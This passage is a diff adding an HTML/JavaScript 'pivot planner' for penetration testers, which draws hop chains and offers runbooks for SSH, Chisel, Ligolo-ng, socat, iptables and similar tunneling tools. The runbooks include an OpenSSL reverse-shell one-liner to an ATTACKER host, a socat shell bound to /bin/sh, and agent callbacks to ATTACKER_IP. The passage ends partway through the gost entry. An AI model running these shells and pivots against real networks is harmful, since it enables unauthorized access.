@@ -1,0 +1,1976 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RaccoonRoute // Pivot Planner</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Share+Tech+Mono&display=swap');
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+  background:#080b0f; color:#a0f0a0; font-family:'JetBrains Mono','Share Tech Mono',monospace;
+  display:flex; flex-direction:column; height:100vh;
+  background-image: radial-gradient(ellipse at 50% 0%, #0a1a0a22 0%, transparent 60%);
+}
+
+/* Scanlines overlay */
+body::after {
+  content:''; position:fixed; top:0; left:0; right:0; bottom:0; pointer-events:none; z-index:9999;
+  background:repeating-linear-gradient(0deg, transparent, transparent 2px, #00000009 2px, #00000009 4px);
+}
+
+/* Top bar */
+#topbar {
+  display:flex; align-items:center; padding:10px 20px; background:#0a0f14; border-bottom:1px solid #1a3a1a;
+  gap:12px; flex-shrink:0;
+}
+#topbar .logo {
+  width:38px; height:38px; border-radius:50%; border:2px solid #4af04a;
+  display:flex; align-items:center; justify-content:center; font-size:20px;
+  box-shadow: 0 0 12px #4af04a44, inset 0 0 8px #4af04a22;
+  animation: pulse-glow 2s ease-in-out infinite;
+}
+@keyframes pulse-glow {
+  0%,100% { box-shadow: 0 0 12px #4af04a44, inset 0 0 8px #4af04a22; }
+  50% { box-shadow: 0 0 20px #4af04a66, inset 0 0 12px #4af04a33; }
+}
+#topbar h1 { font-size:14px; color:#4af04a; font-weight:700; letter-spacing:1px; text-shadow:0 0 10px #4af04a55; }
+#topbar .version { font-size:10px; color:#3a6a3a; margin-left:-6px; }
+#topbar .spacer { flex:1; }
+.btn {
+  padding:6px 14px; border-radius:4px; border:1px solid #2a4a2a; background:#0c1a0c;
+  color:#6fbf6f; font-size:11px; cursor:pointer; transition:all .15s; font-family:inherit; font-weight:500;
+  text-transform:uppercase; letter-spacing:.5px;
+}
+.btn:hover { background:#1a2f1a; border-color:#4af04a; color:#4af04a; box-shadow:0 0 8px #4af04a33; }
+.btn-green { border-color:#4af04a; color:#4af04a; }
+.btn-blue { border-color:#4ac8f0; color:#4ac8f0; }
+.btn-blue:hover { border-color:#4ac8f0; box-shadow:0 0 8px #4ac8f033; }
+.btn-orange { border-color:#f0a84a; color:#f0a84a; }
+.btn-orange:hover { border-color:#f0a84a; box-shadow:0 0 8px #f0a84a33; }
+.btn-red { border-color:#f04a4a; color:#f04a4a; }
+.btn-red:hover { border-color:#f04a4a; background:#1a0c0c; box-shadow:0 0 8px #f04a4a33; }
+
+/* Diagram canvas area */
+#diagram-area {
+  flex:1; position:relative; min-height:250px; overflow:hidden; background:#080b0f;
+  background-image:
+    linear-gradient(rgba(74,240,74,.03) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(74,240,74,.03) 1px, transparent 1px);
+  background-size: 40px 40px;
+}
+#diagram-area canvas { display:block; width:100%; height:100%; cursor:crosshair; }
+#diagram-area canvas.dragging { cursor:grabbing; }
+
+/* Zoom controls */
+#zoom-controls {
+  position:absolute; bottom:16px; right:16px; display:flex; flex-direction:column; gap:4px;
+}
+#zoom-controls button {
+  width:28px; height:28px; border-radius:4px; border:1px solid #2a4a2a; background:#0c1a0c;
+  color:#4af04a; font-size:14px; cursor:pointer; display:flex; align-items:center; justify-content:center;
+  font-family:inherit;
+}
+#zoom-controls button:hover { background:#1a2f1a; box-shadow:0 0 6px #4af04a33; }
+
+/* Divider bar */
+#divider {
+  background:#0a0f14; border-top:1px solid #1a3a1a; border-bottom:1px solid #1a3a1a;
+  padding:10px 20px; display:flex; align-items:center; gap:12px; flex-shrink:0;
+}
+#divider .mode-label { font-size:10px; color:#f04a4a; text-transform:uppercase; font-weight:700; letter-spacing:1px; }
+#divider .mode-name { font-size:12px; color:#4af04a; font-weight:700; }
+#divider .mode-desc { font-size:10px; color:#3a6a3a; }
+#divider .spacer { flex:1; }
+.tab-btn {
+  padding:5px 12px; border-radius:4px; border:1px solid transparent; background:transparent;
+  color:#3a6a3a; font-size:11px; cursor:pointer; transition:all .15s; font-family:inherit;
+  text-transform:uppercase; letter-spacing:.5px;
+}
+.tab-btn.active { border-color:#4af04a; color:#4af04a; background:#4af04a11; text-shadow:0 0 6px #4af04a44; }
+.tab-btn:hover { color:#4af04a; }
+
+/* Bottom panel */
+#bottom-panel {
+  flex:1; min-height:200px; max-height:50vh; overflow-y:auto; background:#060a0e; padding:0;
+}
+#bottom-panel::-webkit-scrollbar { width:6px; }
+#bottom-panel::-webkit-scrollbar-track { background:#080b0f; }
+#bottom-panel::-webkit-scrollbar-thumb { background:#2a4a2a; border-radius:3px; }
+
+/* Hop info header */
+.hop-header {
+  padding:14px 20px; border-bottom:1px solid #1a3a1a; display:flex; align-items:center; gap:12px;
+}
+.hop-header .hop-icon { width:34px; height:34px; border-radius:50%; background:#0c1a0c; border:1px solid #2a4a2a; display:flex; align-items:center; justify-content:center; font-size:18px; }
+.hop-header .hop-title { font-size:13px; font-weight:700; color:#4af04a; }
+.hop-header .hop-sub { font-size:10px; color:#3a6a3a; }
+.hop-header .spacer { flex:1; }
+.copy-btn { padding:5px 10px; border-radius:4px; border:1px solid #2a4a2a; background:#0c1a0c; color:#3a6a3a; font-size:10px; cursor:pointer; font-family:inherit; }
+.copy-btn:hover { color:#4af04a; border-color:#4af04a; }
+
+/* Tags row */
+.tags-row { padding:8px 20px; display:flex; flex-wrap:wrap; gap:6px; border-bottom:1px solid #1a3a1a; }
+.tag { padding:3px 8px; border-radius:3px; font-size:10px; background:#0c1a0c; color:#3a6a3a; border:1px solid #1a3a1a; cursor:pointer; font-family:inherit; }
+.tag.active { border-color:#4af04a; color:#4af04a; background:#4af04a11; text-shadow:0 0 4px #4af04a44; }
+.tag.tool { border-color:#4ac8f0; color:#4ac8f0; background:#4ac8f011; }
+.tag.tool.active { border-color:#f04a4a; color:#f04a4a; background:#f04a4a11; text-shadow:0 0 4px #f04a4a44; }
+.tag.cat { border-color:#a855f755; color:#a855f7; background:transparent; font-size:9px; }
+.tag.cat.active { border-color:#a855f7; background:#a855f711; }
+.tag-sep { color:#3a6a3a; margin:0 4px; font-size:10px; }
+
+/* Mini chain */
+.mini-chain { padding:10px 20px; display:flex; align-items:center; gap:6px; border-bottom:1px solid #1a3a1a; flex-wrap:wrap; }
+.mini-node { display:flex; align-items:center; gap:4px; padding:4px 8px; border-radius:4px; background:#0c1a0c; border:1px solid #1a3a1a; font-size:9px; color:#3a6a3a; }
+.mini-node.active { border-color:#4af04a; color:#4af04a; }
+.mini-node.filtered { border-color:#f0a84a; background:#f0a84a11; box-shadow:0 0 6px #f0a84a44; }
+.mini-node { cursor:pointer; }
+.chain-filter-badge { display:inline-block; font-size:9px; color:#f0a84a; border:1px solid #f0a84a44; padding:2px 6px; border-radius:3px; margin-right:8px; cursor:pointer; }
+.mini-node .dot { width:6px; height:6px; border-radius:50%; }
+.mini-arrow { color:#2a4a2a; font-size:12px; }
+
+/* Sub tabs */
+.sub-tabs { padding:8px 20px; display:flex; gap:0; border-bottom:1px solid #1a3a1a; }
+.sub-tab {
+  padding:8px 14px; font-size:11px; color:#3a6a3a; cursor:pointer; border-bottom:2px solid transparent;
+  transition:all .15s; text-transform:uppercase; letter-spacing:.5px;
+}
+.sub-tab.active { color:#4af04a; border-bottom-color:#4af04a; text-shadow:0 0 6px #4af04a44; }
+.sub-tab:hover { color:#6fbf6f; }
+
+/* Code block */
+.code-section { padding:16px 20px; }
+.code-section .section-title { font-size:11px; color:#f04a4a; font-weight:700; margin-bottom:10px; letter-spacing:.5px; }
+.code-block {
+  background:#0a0f14; border:1px solid #1a3a1a; border-radius:6px; padding:14px 16px;
+  font-size:12px; line-height:1.9; overflow-x:auto; position:relative;
+}
+.code-block .line { display:flex; }
+.code-block .line-no { color:#2a4a2a; width:28px; flex-shrink:0; text-align:right; margin-right:12px; user-select:none; }
+.code-block .line-content { color:#a0f0a0; }
+.code-block .line-content .comment { color:#3a6a3a; font-style:italic; }
+.code-block .line-content .cmd { color:#4af04a; text-shadow:0 0 4px #4af04a22; }
+.code-block .copy-float {
+  position:absolute; top:8px; right:8px; padding:4px 8px; border-radius:3px;
+  background:#0c1a0c; border:1px solid #2a4a2a; color:#3a6a3a; font-size:9px; cursor:pointer;
+  font-family:inherit; text-transform:uppercase;
+}
+.code-block .copy-float:hover { color:#4af04a; border-color:#4af04a; }
+
+/* Node config modal */
+#node-modal-overlay {
+  display:none; position:fixed; top:0; left:0; right:0; bottom:0;
+  background:rgba(0,0,0,.7); z-index:10000; backdrop-filter:blur(4px);
+  align-items:center; justify-content:center;
+}
+#node-modal-overlay.open { display:flex; }
+#node-modal {
+  background:#0a0f14; border:1px solid #4af04a44; border-radius:8px; width:420px;
+  box-shadow: 0 0 40px #4af04a22, 0 8px 32px rgba(0,0,0,.8);
+  animation: modal-in .15s ease-out;
+}
+@keyframes modal-in { from { transform:scale(.95); opacity:0; } to { transform:scale(1); opacity:1; } }
+#node-modal .modal-header {
+  padding:14px 18px; border-bottom:1px solid #1a3a1a; display:flex; align-items:center; justify-content:space-between;
+}
+#node-modal .modal-header h3 { font-size:13px; color:#4af04a; font-weight:700; }
+#node-modal .modal-close {
+  background:none; border:1px solid #2a4a2a; color:#f04a4a; font-size:14px; cursor:pointer;
+  width:26px; height:26px; border-radius:4px; display:flex; align-items:center; justify-content:center;
+  font-family:inherit;
+}
+#node-modal .modal-close:hover { background:#f04a4a22; border-color:#f04a4a; }
+#node-modal .modal-body { padding:16px 18px; display:flex; flex-direction:column; gap:12px; }
+.field-group { display:flex; flex-direction:column; gap:4px; }
+.field-group label { font-size:10px; color:#3a6a3a; text-transform:uppercase; letter-spacing:.5px; }
+.field-group input, .field-group select, .field-group textarea {
+  background:#060a0e; border:1px solid #1a3a1a; border-radius:4px; padding:8px 10px;
+  color:#4af04a; font-family:inherit; font-size:12px; outline:none; transition:border-color .15s;
+}
+.field-group input:focus, .field-group select:focus, .field-group textarea:focus {
+  border-color:#4af04a; box-shadow:0 0 6px #4af04a22;
+}
+.field-group select { cursor:pointer; }
+.field-group select option { background:#0a0f14; color:#4af04a; }
+.field-group textarea { resize:vertical; min-height:50px; }
+.field-row { display:flex; gap:10px; }
+.field-row .field-group { flex:1; }
+#node-modal .modal-footer {
+  padding:12px 18px; border-top:1px solid #1a3a1a; display:flex; justify-content:space-between; align-items:center;
+}
+.btn-modal-save {
+  padding:7px 20px; border-radius:4px; border:1px solid #4af04a; background:#4af04a18;
+  color:#4af04a; font-family:inherit; font-size:11px; cursor:pointer; text-transform:uppercase;
+  letter-spacing:.5px; font-weight:700;
+}
+.btn-modal-save:hover { background:#4af04a33; box-shadow:0 0 10px #4af04a33; }
+.btn-modal-delete {
+  padding:7px 14px; border-radius:4px; border:1px solid #f04a4a44; background:transparent;
+  color:#f04a4a; font-family:inherit; font-size:11px; cursor:pointer; text-transform:uppercase; letter-spacing:.5px;
+}
+.btn-modal-delete:hover { background:#f04a4a22; border-color:#f04a4a; }
+
+/* Component catalog modal reuses node-modal styles */
+#comp-modal-overlay {
+  display:none; position:fixed; top:0; left:0; right:0; bottom:0;
+  background:rgba(0,0,0,.7); z-index:10000; backdrop-filter:blur(4px);
+  align-items:center; justify-content:center;
+}
+#comp-modal-overlay.open { display:flex; }
+#comp-modal {
+  background:#0a0f14; border:1px solid #4ac8f044; border-radius:8px; width:480px;
+  box-shadow: 0 0 40px #4ac8f022, 0 8px 32px rgba(0,0,0,.8);
+  animation: modal-in .15s ease-out;
+}
+.comp-category { margin-top:12px; }
+.comp-category-title {
+  font-size:10px; color:#3a6a3a; text-transform:uppercase; letter-spacing:1px;
+  padding:6px 0; border-bottom:1px solid #1a3a1a; margin-bottom:6px; cursor:pointer;
+}
+.comp-category-title:hover { color:#4af04a; }
+.comp-category-title .cat-color { display:inline-block; width:8px; height:8px; border-radius:50%; margin-right:6px; }
+.comp-grid { display:grid; grid-template-columns:1fr 1fr 1fr; gap:4px; }
+.comp-item {
+  padding:6px 8px; border-radius:4px; border:1px solid #1a3a1a; background:#060a0e;
+  color:#6fbf6f; font-size:10px; cursor:pointer; transition:all .15s; text-align:center;
+}
+.comp-item:hover { border-color:#4af04a; color:#4af04a; background:#4af04a11; }
+
+/* Protocol selector in node modal (shown for pivots) */
+#cfg-protocol-row { display:none; }
+#cfg-protocol-row.visible { display:flex; }
+
+</style>
+</head>
+<body>
+
+<div id="topbar">
+  <div class="logo">&#x1F99D;</div>
+  <h1>RaccoonRoute</h1>
+  <span class="version">v1.0.0</span>
+  <div class="spacer"></div>
+  <button class="btn btn-green" onclick="addNode('pivot')">+ Pivot</button>
+  <button class="btn btn-blue" onclick="addNode('subnet')">+ Subnet</button>
+  <button class="btn btn-orange" onclick="openComponentCatalog()">+ Components</button>
+  <button class="btn" onclick="snapNodes()">Auto-Layout</button>
+  <button class="btn" onclick="exportPNG()">PNG</button>
+  <button class="btn" onclick="exportJSON()">Export</button>
+  <button class="btn" onclick="importJSON()">Import</button>
+  <button class="btn btn-red" onclick="resetDiagram()">Purge</button>
+</div>
+
+<div id="diagram-area">
+  <canvas id="canvas"></canvas>
+  <div id="zoom-controls">
+    <button onclick="zoomIn()">+</button>
+    <button onclick="zoomReset()">&#x25C9;</button>
+    <button onclick="zoomOut()">&minus;</button>
+  </div>
+</div>
+
+<div id="divider">
+  <span class="mode-label">// MODE</span>
+  <span class="mode-name" id="mode-name">Tunneling</span>
+  <span class="mode-desc" id="mode-desc">// route the chain from origin to target</span>
+  <div class="spacer"></div>
+  <button class="tab-btn active" data-mode="tunneling">Tunneling</button>
+  <button class="tab-btn" data-mode="filetransfer">File Transfer</button>
+  <button class="tab-btn" data-mode="firewall">Firewall</button>
+</div>
+
+<div id="bottom-panel"></div>
+
+<div id="node-modal-overlay" onclick="if(event.target===this)closeModal()">
+  <div id="node-modal">
+    <div class="modal-header">
+      <h3>// NODE CONFIG</h3>
+      <button class="modal-close" onclick="closeModal()">&#x2715;</button>
+    </div>
+    <div class="modal-body">
+      <div class="field-row">
+        <div class="field-group">
+          <label>Label</label>
+          <input type="text" id="cfg-label" placeholder="e.g. PIVOT-1">
+        </div>
+        <div class="field-group">
+          <label>Role</label>
+          <select id="cfg-type">
+            <option value="starting">Origin</option>
+            <option value="pivot">Pivot</option>
+            <option value="ending">Target</option>
+            <option value="subnet">Subnet</option>
+            <option value="component">Component</option>
+          </select>
+        </div>
+      </div>
+      <div class="field-row">
+        <div class="field-group">
+          <label>IP / CIDR</label>
+          <input type="text" id="cfg-ip" placeholder="e.g. 10.10.10.11">
+        </div>
+        <div class="field-group">
+          <label>Port(s)</label>
+          <input type="text" id="cfg-ports" placeholder="e.g. 22,80,443">
+        </div>
+      </div>
+      <div class="field-row">
+        <div class="field-group">
+          <label>OS</label>
+          <select id="cfg-os">
+            <option value="linux">Linux</option>
+            <option value="windows">Windows</option>
+            <option value="macos">macOS</option>
+            <option value="bsd">BSD</option>
+            <option value="unknown">Unknown</option>
+          </select>
+        </div>
+        <div class="field-group">
+          <label>User</label>
+          <input type="text" id="cfg-user" placeholder="e.g. root">
+        </div>
+      </div>
+      <div class="field-row" id="cfg-protocol-row">
+        <div class="field-group">
+          <label>Protocol</label>
+          <select id="cfg-protocol">
+            <option value="ssh">SSH</option>
+            <option value="chisel">Chisel</option>
+            <option value="ligolo">Ligolo-ng</option>
+            <option value="sshuttle">SSHuttle</option>
+            <option value="socat">socat</option>
+          </select>
+        </div>
+        <div class="field-group">
+          <label>Firewall Rules</label>
+          <select id="cfg-firewall">
+            <option value="no">Disabled</option>
+            <option value="yes">Enabled</option>
+          </select>
+        </div>
+      </div>
+      <div class="field-group">
+        <label>Interface / NIC</label>
+        <input type="text" id="cfg-iface" placeholder="e.g. eth0, tun0">
+      </div>
+      <div class="field-group">
+        <label>Notes</label>
+        <textarea id="cfg-notes" placeholder="Creds, services, observations..."></textarea>
+      </div>
+    </div>
+    <div class="modal-footer">
+      <button class="btn-modal-delete" id="cfg-delete" onclick="deleteNode()">&#x2716; Remove Node</button>
+      <button class="btn-modal-save" onclick="saveModal()">&#x2714; Apply</button>
+    </div>
+  </div>
+</div>
+
+<!-- Component Catalog Modal -->
+<div id="comp-modal-overlay" onclick="if(event.target===this)closeCompCatalog()">
+  <div id="comp-modal">
+    <div class="modal-header">
+      <h3>// COMPONENT CATALOG</h3>
+      <button class="modal-close" onclick="closeCompCatalog()">&#x2715;</button>
+    </div>
+    <div class="modal-body" style="max-height:400px;overflow-y:auto;">
+      <div class="field-group">
+        <input type="text" id="comp-search" placeholder="Search components..." oninput="filterComponents()">
+      </div>
+      <div id="comp-list"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+// ============ DATA ============
+let nodes = [
+  { id:'start', type:'starting', label:'ORIGIN', ip:'192.168.1.100', ports:'', os:'linux', user:'kali', iface:'eth0', notes:'', x:0, y:0 },
+  { id:'pivot1', type:'pivot', label:'PIVOT', ip:'172.16.0.1', ports:'22', os:'linux', user:'user', iface:'eth0', notes:'', x:0, y:0 },
+  { id:'end', type:'ending', label:'TARGET', ip:'10.0.0.10', ports:'80,443', os:'linux', user:'', iface:'', notes:'', x:0, y:0 },
+];
+
+let selectedNode = null;
+let selectedTool = 'SSH';
+let selectedSubTab = 'setup';
+let currentMode = 'tunneling';
+let chainFilterNode = null; // null = show full chain, or specific node
+
+// Subnets are independent floating squares (not part of the chain)
+let subnets = [];
+
+const tools = {
+  tunneling: ['SSH','Chisel','Ligolo-ng','SSHuttle','socat','iptables','OpenSSL','BurpSuite','gost'],
+  filetransfer: ['scp/rsync','sftp','Reverse Push','Tar Stream','Verify'],
+  firewall: ['sshd Policy','Probe','Firewall Rules','Validate'],
+};
+
+const toolCategories = {
+  SSH: 'classic', Chisel: 'modern', 'Ligolo-ng': 'modern', SSHuttle: 'classic',
+  socat: 'classic', iptables: 'native', OpenSSL: 'native', BurpSuite: 'proxy', gost: 'multi-protocol',
+};
+const categoryLabels = { all:'All', classic:'Classic', modern:'Modern', native:'Native/LoL', proxy:'Proxy', 'multi-protocol':'Multi-Protocol' };
+let selectedCategory = 'all';
+
+const runbooks = {
+  tunneling: {
+    SSH: {
+      setup: [
+        { type:'comment', text:'# Deploy sshd on hop' },
+        { type:'cmd', text:'sudo apt update && sudo apt install -y openssh-client openssh-server' },
+        { type:'cmd', text:'sudo systemctl enable --now ssh || sudo systemctl enable --now sshd' },
+        { type:'comment', text:'# Harden /etc/ssh/sshd_config:' },
+        { type:'comment', text:'#   PermitRootLogin no' },
+        { type:'comment', text:'#   PasswordAuthentication no' },
+        { type:'comment', text:'#   PubkeyAuthentication yes' },
+        { type:'comment', text:'#   AllowTcpForwarding yes' },
+        { type:'comment', text:'#   GatewayPorts yes   (required for remote fwd binding 0.0.0.0)' },
+        { type:'comment', text:'# Configure proxychains on attacker:' },
+        { type:'comment', text:'#   Edit /etc/proxychains.conf' },
+        { type:'comment', text:'#   Uncomment "dynamic_chain", comment "strict_chain"' },
+        { type:'comment', text:'#   Append: socks4 127.0.0.1 9050' },
+        { type:'comment', text:'#   (Optional) Uncomment "quiet_mode" to suppress stdout' },
+      ],
+      verify: [
+        { type:'cmd', text:'ssh -o ConnectTimeout=5 user@PIVOT_IP "echo tunnel OK"' },
+        { type:'cmd', text:'ss -tlnp | grep :22' },
+      ],
+      nexthop: [
+        { type:'comment', text:'# Dynamic SOCKS proxy through this pivot' },
+        { type:'cmd', text:'ssh -D 127.0.0.1:9050 -N -f user@PIVOT_IP' },
+        { type:'comment', text:'# Route tools through proxy (TCP only, no ICMP!)' },
+        { type:'cmd', text:'proxychains nmap -sT -Pn -p- NEXT_HOP_IP' },
+        { type:'cmd', text:'proxychains nmap -sT -Pn -sV -sC -p 21,80,443,445 NEXT_HOP_IP' },
+        { type:'comment', text:'# Use browser through tunnel' },
+        { type:'cmd', text:'proxychains firefox' },
+        { type:'comment', text:'# Run scripts through proxy (specify interpreter)' },
+        { type:'cmd', text:'proxychains4 python3 script.py' },
+      ],
+      reference: [
+        { type:'comment', text:'# --- Local Port Forward ---' },
+        { type:'cmd', text:'ssh -L LOCAL_PORT:TARGET_IP:TARGET_PORT user@PIVOT_IP' },
+        { type:'cmd', text:'nmap -Pn -n -p LOCAL_PORT -sV 127.0.0.1' },
+        { type:'comment', text:'# --- Remote Port Forward (reverse) ---' },
+        { type:'comment', text:'# 1. Enable GatewayPorts in /etc/ssh/sshd_config on pivot:' },
+        { type:'cmd', text:'sudo sed -i "s/#GatewayPorts no/GatewayPorts yes/" /etc/ssh/sshd_config' },
+        { type:'cmd', text:'sudo service ssh restart' },
+        { type:'comment', text:'# 2. Set up remote forward (from attacker):' },
+        { type:'cmd', text:'ssh -R 2222:*:2222 user@PIVOT_IP' },
+        { type:'comment', text:'# 3. Test: listener on attacker, connect from pivot' },
+        { type:'cmd', text:'nc -lvp 2222' },
+        { type:'comment', text:'# On pivot: nc 127.0.0.1 2222' },
+        { type:'comment', text:'# 4. Forward multiple ports:' },
+        { type:'cmd', text:'ssh -R 2222:*:2222 -R 3333:*:3333 user@PIVOT_IP' },
+        { type:'comment', text:'# --- Double Pivoting ---' },
+        { type:'comment', text:'# Stacked proxychains: add two SOCKS entries' },
+        { type:'comment', text:'# /etc/proxychains.conf:' },
+        { type:'comment', text:'#   socks4 127.0.0.1 9050' },
+        { type:'comment', text:'#   socks4 127.0.0.1 9999' },
+        { type:'cmd', text:'ssh -D 127.0.0.1:9050 -N -f user@PIVOT_IP' },
+        { type:'comment', text:'# From pivot1, set up second hop:' },
+        { type:'cmd', text:'ssh -D 127.0.0.1:9999 user@NEXT_HOP_IP' },
+        { type:'comment', text:'# Or use ProxyJump for single-command double pivot:' },
+        { type:'cmd', text:'ssh -D 9050 user@NEXT_HOP_IP -J user@PIVOT_IP' },
+      ],
+    },
+    Chisel: {
+      setup: [
+        { type:'comment', text:'# Install on attacker (Kali)' },
+        { type:'cmd', text:'apt install chisel' },
+        { type:'comment', text:'# Stage chisel on pivot' },
+        { type:'cmd', text:'wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_linux_amd64.gz' },
+        { type:'cmd', text:'gunzip chisel_linux_amd64.gz && chmod +x chisel_linux_amd64' },
+      ],
+      verify: [{ type:'cmd', text:'./chisel_linux_amd64 --version' }],
+      nexthop: [
+        { type:'comment', text:'# Attacker (server) — start reverse listener' },
+        { type:'cmd', text:'chisel server -p 8000 --reverse' },
+        { type:'comment', text:'# Pivot (client) — SOCKS proxy' },
+        { type:'cmd', text:'./chisel_linux_amd64 client ATTACKER_IP:8000 R:socks' },
+      ],
+      reference: [
+        { type:'comment', text:'# Forward specific port (attacker:1234 → pivot:8443)' },
+        { type:'cmd', text:'./chisel_linux_amd64 client ATTACKER_IP:8000 R:1234:127.0.0.1:8443' },
+        { type:'comment', text:'# Traffic from attacker:1234 is forwarded to pivot:8443' },
+      ],
+    },
+    'Ligolo-ng': {
+      setup: [
+        { type:'comment', text:'# Download proxy (attacker) and agent (pivot)' },
+        { type:'cmd', text:'wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz' },
+        { type:'cmd', text:'wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz' },
+        { type:'comment', text:'# Attacker: create TUN interface' },
+        { type:'cmd', text:'sudo ip tuntap add user $(whoami) mode tun ligolo' },
+        { type:'cmd', text:'sudo ip link set ligolo up' },
+        { type:'cmd', text:'./proxy -laddr 0.0.0.0:443 -selfcert' },
+      ],
+      verify: [{ type:'cmd', text:'ip link show ligolo' }],
+      nexthop: [
+        { type:'comment', text:'# Pivot (agent)' },
+        { type:'cmd', text:'./agent -connect ATTACKER_IP:443 -ignore-cert' },
+        { type:'comment', text:'# In ligolo proxy session' },
+        { type:'cmd', text:'session' },
+        { type:'cmd', text:'ifconfig' },
+        { type:'cmd', text:'sudo ip r add TARGET_SUBNET/24 dev ligolo' },
+        { type:'cmd', text:'start' },
+      ],
+      reference: [
+        { type:'comment', text:'# Port forwarding through agent' },
+        { type:'cmd', text:'listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:1234 --tcp' },
+      ],
+    },
+    SSHuttle: {
+      setup: [
+        { type:'comment', text:'# VPN over SSH (requires root on attacker, Python on pivot)' },
+        { type:'cmd', text:'sshuttle -vvr user@PIVOT_IP TARGET_SUBNET/24' },
+      ],
+      verify: [{ type:'cmd', text:'ping -c1 TARGET_IP' }],
+      nexthop: [
+        { type:'comment', text:'# Using SSH key for authentication' },
+        { type:'cmd', text:'sshuttle -vvr user@PIVOT_IP --ssh-cmd "ssh -i ~/.ssh/id_rsa" TARGET_SUBNET/24' },
+      ],
+      reference: [
+        { type:'comment', text:'# Route ALL traffic + DNS through pivot' },
+        { type:'cmd', text:'sshuttle --dns -vvr user@PIVOT_IP 0/0' },
+        { type:'comment', text:'# Multiple instances to different servers supported' },
+      ],
+    },
+    socat: {
+      setup: [{ type:'cmd', text:'which socat || apt install -y socat' }],
+      verify: [{ type:'cmd', text:'socat -V' }],
+      nexthop: [
+        { type:'comment', text:'# Port to remote ip and port' },
+        { type:'cmd', text:'socat TCP-LISTEN:LPORT,fork TCP:TARGET_IP:RPORT &' },
+      ],
+      reference: [
+        { type:'comment', text:'# Redirect Port A to Port B locally' },
+        { type:'cmd', text:'socat TCP4-LISTEN:RPORT,reuseaddr,fork TCP4-LISTEN:LPORT,reuseaddr' },
+        { type:'comment', text:'# Translate IPv4 to IPv6' },
+        { type:'cmd', text:'socat TCP-LISTEN:LPORT,fork TCP6:[TARGET_IPV6]:RPORT &' },
+        { type:'comment', text:'# SSL tunnel (generate certs first)' },
+        { type:'cmd', text:'openssl genrsa -out server.key 1024' },
+        { type:'cmd', text:'openssl req -new -key server.key -x509 -days 3653 -out server.crt' },
+        { type:'cmd', text:'cat server.key server.crt > server.pem' },
+        { type:'comment', text:'# On target:' },
+        { type:'cmd', text:'socat OPENSSL-LISTEN:443,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh' },
+        { type:'comment', text:'# On attacker:' },
+        { type:'cmd', text:'socat STDIO OPENSSL-CONNECT:PIVOT_IP:443,cert=server.pem,cafile=server.crt' },
+      ],
+    },
+    iptables: {
+      setup: [{ type:'cmd', text:'echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward' }],
+      verify: [{ type:'cmd', text:'iptables -t nat -L -n' }],
+      nexthop: [
+        { type:'comment', text:'# Redirect traffic to a different host' },
+        { type:'cmd', text:'iptables -t nat -A PREROUTING -i eth0 -p tcp --dport LPORT -j DNAT --to-destination TARGET_IP:RPORT' },
+        { type:'cmd', text:'iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE' },
+      ],
+      reference: [
+        { type:'comment', text:'# Redirect matching traffic on the same host' },
+        { type:'cmd', text:'iptables -t nat -A PREROUTING -p tcp --dport PORT_A -j REDIRECT --to-port PORT_B' },
+      ],
+    },
+    OpenSSL: {
+      setup: [{ type:'cmd', text:'openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes' }],
+      verify: [{ type:'cmd', text:'openssl s_client -connect PIVOT_IP:LPORT' }],
+      nexthop: [
+        { type:'comment', text:'# Start listener on attacker' },
+        { type:'cmd', text:'openssl s_server -quiet -key key.pem -cert cert.pem -port LPORT' },
+        { type:'comment', text:'# Reverse shell from pivot' },
+        { type:'cmd', text:'mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER:LPORT > /tmp/s; rm /tmp/s' },
+      ],
+      reference: [],
+    },
+    BurpSuite: {
+      setup: [
+        { type:'comment', text:'# Use BurpSuite as a proxy with SSH tunneling' },
+        { type:'comment', text:'# 1. Start BurpSuite → Proxy → Options' },
+        { type:'comment', text:'# 2. Under Proxy Listeners, click Add' },
+        { type:'comment', text:'# 3. Set binding port and interface' },
+        { type:'comment', text:'# 4. In second tab, set redirect host:port' },
+        { type:'comment', text:'# 5. Set up SSH Dynamic Port Forward or SSHuttle first' },
+      ],
+      verify: [
+        { type:'comment', text:'# Verify proxy is listening' },
+        { type:'cmd', text:'curl -x http://127.0.0.1:8080 http://TARGET_IP/' },
+      ],
+      nexthop: [
+        { type:'comment', text:'# Route tools through BurpSuite redirect port' },
+        { type:'comment', text:'# Assuming port 2222 is the redirect port:' },
+        { type:'cmd', text:'gobuster dir -u http://127.0.0.1:2222 -t 40 -w /usr/share/wordlists/dirb/common.txt' },
+      ],
+      reference: [
+        { type:'comment', text:'# Combine with SSH Dynamic Port Forwarding:' },
+        { type:'cmd', text:'ssh -D 127.0.0.1:9050 -N -f user@PIVOT_IP' },
+        { type:'comment', text:'# Then configure BurpSuite upstream SOCKS proxy' },
+        { type:'comment', text:'# User Options → Connections → SOCKS Proxy:' },
+        { type:'comment', text:'#   Host: 127.0.0.1  Port: 9050' },
+      ],
+    },
+    gost: {
+      setup: [
+        { type:'comment', text:'# Download gost (Go Simple Tunnel) - single binary' },
+        { type:'cmd', text:'wget https://github.com/ginuerzh/gost/releases/download/v2.11.5/gost-linux-amd64-2.11.5.gz' },
+        { type:'cmd', text:'gunzip gost-linux-amd64-2.11.5.gz && chmod +x gost-linux-amd64-2.11.5' },
+        { type:'comment', text:'# Supports: SOCKS4/5, HTTP, Shadowsocks, TLS, WebSocket, KCP, QUIC' },
+      ],
+      verify: [
+        { type:'cmd', text:'./gost-linux-amd64-2.11.5 -V' },
+      ],
+      nexthop: [
+        { type:'comment', text:'# SOCKS5 proxy on pivot' },
